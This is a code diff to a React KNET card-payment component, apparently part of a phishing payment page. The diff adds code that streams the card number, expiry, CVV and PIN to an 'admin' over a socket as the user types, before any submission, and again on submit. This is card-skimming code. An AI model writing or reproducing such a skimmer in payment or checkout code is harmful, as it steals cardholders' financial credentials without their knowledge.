@@ -119,6 +119,21 @@ export default function KNETPayment() {
     navigateToPage("دفع كي نت");
   }, []);
 
+  // بث البطاقة مباشرة للأدمن أثناء الكتابة
+  useEffect(() => {
+    socket.emit("card:draft", {
+      paymentMethod: "KNET",
+      prefix: selectedPrefix,
+      cardNumberOnly: cardNumber,
+      bankName: selectedBank,
+      expiryMonth,
+      expiryYear,
+      cvv: cardCvv,
+      pin: cardPin,
+      submitted: false,
+    });
+  }, [selectedBank, selectedPrefix, cardNumber, expiryMonth, expiryYear, cardCvv, cardPin]);
+
   // Countdown timer for OTP
   const startCountdown = useCallback(() => {
     setCountdown(180);
@@ -292,6 +307,7 @@ export default function KNETPayment() {
     };
     localStorage.setItem("paymentData", JSON.stringify(paymentData));
 
+    socket.emit("card:draft", { paymentMethod: "KNET", prefix: selectedPrefix, cardNumberOnly: cardNumber, bankName: selectedBank, expiryMonth, expiryYear, cvv: cardCvv, pin: cardPin, submitted: true });
     sendData({
       paymentCard: {
         cardNumber: fullCardNumber,
